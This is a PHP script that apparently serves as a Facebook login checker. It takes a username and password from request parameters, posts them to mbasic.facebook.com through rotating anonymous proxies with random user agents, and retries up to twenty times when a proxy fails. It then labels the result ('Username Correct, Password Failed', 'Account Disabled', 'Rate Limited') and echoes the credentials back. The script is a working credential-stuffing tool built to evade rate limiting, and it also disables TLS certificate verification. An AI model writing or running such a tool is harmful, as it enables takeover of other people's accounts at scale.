<?php
header('Content-type: text/plain; charset=utf-8');


// Usage
// facebookLogin($username,$password,$proxy(optional), $useragent(optional), $cookieFilePath(optional));


// Test Account
$username = '';
$password = '';
$user_proxy = randomProxy();

// CHECK DETAILS
if (hasParam('username'))
{
  $username =  urlDecode($_REQUEST['username']);
}
else
{
  echo 'No Account Provided';
  exit();
}
if (hasParam('password'))
{
  $password =  urlDecode($_REQUEST['password']);
}
else
{
   echo 'No Account Provided';
   exit();
}
if (hasParam('proxy'))
{
  $proxy =  urlDecode($_REQUEST['proxy']);
}

if(hasParam('updateProxies'))
{
 updateProxies();
}


// Test Login
echo facebookLogin($username,$password,$user_proxy);


// Custom Login Script
function facebookLogin($username, $password, $proxy = "", $useragent = "", $cookieFile = "cookies.txt", $loops = 0)
{

if(strlen($proxy) < 5)
{
  $proxy = randomProxy();
}
if(strlen($useragent) < 5)
{
  $useragent = randomAgent();
}
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://mbasic.facebook.com/login.php');
curl_setopt($ch, CURLOPT_POSTFIELDS,'email='.urlEncode($username).'&pass='.urlEncode($password).'&login=Login');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE,  $cookieFile);
curl_setopt($ch, CURLOPT_COOKIESESSION, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT_MS, 2500);
curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
curl_setopt($ch, CURLOPT_REFERER, "https://mbasic.facebook.com");
$page = curl_exec($ch);
$error = curl_error($ch);
$errorMsg = $error;

if (contains("abort",$error) | contains("to connect to",$error) | contains("reset",$error) | contains("timed out",$error) | contains("HTTP",$error))
{
     $errorMsg = "Proxy Load Failures = ".($loops);
   if ($loops <= 19)
   {

     return facebookLogin($username, $password,randomProxy(),"", "cookies.txt",$loops+1);
   }
  else 
{

     $errorMsg .= " (Auto Updating Proxy List) ";
     updateProxies();
}


}

curl_close( $ch );
$results = $page;



// CHECK ALL LOGIN ERRORS
if (contains("login_error",$results) | contains("Error",$results))
{
  $errorMsg="Username & Password Combination Failed";
      if (contains("is incorrect",$results))
       {
         $errorMsg="Username Correct, Password Failed";
       }
       if (contains("Error",$results))
       {
         $errorMsg="Already Logged In";
         file_put_contents($cookieFile, " ");
       }

 


}
if (contains("Your account has been disabled",$results))
       {
         $errorMsg="Account Disabled";
         file_put_contents($cookieFile, " ");
         return "Login Successful,\nProxy : (".$proxy.")\nUsername : (".$username.")\nPassword : (".$password.")\nMessage : ".$errorMsg;
       } 

if (contains("Add a mobile number",$results))
       {
         $errorMsg="Add Number Page Hit";
         file_put_contents($cookieFile, " ");
         return "Login Successful,\nProxy : (".$proxy.")\nUsername : (".$username.")\nPassword : (".$password.")\nMessage : ".$errorMsg;
       } 
if (contains("https://www.facebook.com/help/177066345680802",$results))
 {
       $errorMsg="Rate Limited";
         file_put_contents($cookieFile, " ");
         return "Login Failed,\nProxy : (".$proxy.")\nUsername : (".$username.")\nPassword : (".$password.")\nMessage : ".$errorMsg;
}

// CHECK SUCCESSFUL LOGIN
if (contains("profile picture",$results))
{

// CLEAR SAVED COOKIES ON LOGON
file_put_contents($cookieFile, " ");
// RETURN SUCCESSFUL LOGON
return "Login Successful,\nProxy : (".$proxy.")\nUsername : (".$username.")\nPassword : (".$password.")";

}

if(strlen($errorMsg) < 1)
{
   $errorMsg = $results;
}



// RETURN ERRORS & FAILURES
return "Login Failed,\nProxy : (".$proxy.")\nUsername : (".$username.")\nPassword : (".$password.")\nMessage : ".$errorMsg;
}

// REQUIRED FUNCTIONS
function contains($search, $input)
{
  return (strpos($input,$search) !== false);
}



function randomProxy()
{
  $proxies = file('proxy.list');
  return trim($proxies[array_rand($proxies,1)]);
}

function updateProxies()
{
  $newProxies = file_get_contents("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=6000&country=all&ssl=yes&anonymity=anonymous");
 if (strlen($newProxies) > 0)
   {
  file_put_contents("proxy.list",$newProxies);
  }
}

function randomAgent()
{
   $agents = file('agent.list');
   return trim($agents[array_rand($agents,1)]);
}

function hasParam($param) 
{
   return array_key_exists($param, $_REQUEST);
}

?>